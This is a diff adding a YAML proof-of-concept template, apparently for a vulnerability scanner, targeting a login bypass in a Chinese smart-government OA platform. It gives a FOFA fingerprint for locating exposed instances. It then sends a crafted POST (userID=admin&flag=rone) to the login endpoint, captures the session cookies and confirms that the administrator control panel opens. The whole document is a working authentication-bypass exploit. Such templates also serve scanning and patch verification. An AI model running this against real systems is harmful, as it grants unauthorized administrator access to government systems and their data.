@@ -1,0 +1,27 @@
+id: poc-yaml-szt-smart-governmet-login-bypass
+info:
+  name: 数字通云平台智慧政务 login 存在登录绕过
+  severity: high
+  tags:
+  - 权限绕过
+  finger: 数字通云平台智慧政务OA
+  fofa: body="assets/8cca19ff/css/bootstrap-yii.css"
+requests:
+- method: POST
+  path: /portal/default/login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: userID=admin&flag=rone
+  output:
+  - regex_match(headers,"GOASESSID=(?P<cookie1>.*?);")
+  - regex_match(headers,` (?P<cookie2>.*?); expires`)
+  expression: "status_code == 302 && \nbody == \"\"\n"
+- method: GET
+  path: /theme/concise
+  headers:
+    Cookie: GOASESSID={{.cookie1}};{{.cookie2}}
+  expression: "status_code == 200 && \ncontains(body,\"您好，系统管理员\") &&\ncontains(body,\"\
+    我在线上\") &&\ncontains(body,\"控制面板\") &&\ncontains(body,\"密码修改\") &&\ncontains(body,\"\
+    个人信息\")\n"
+variables: {}
+transport: http
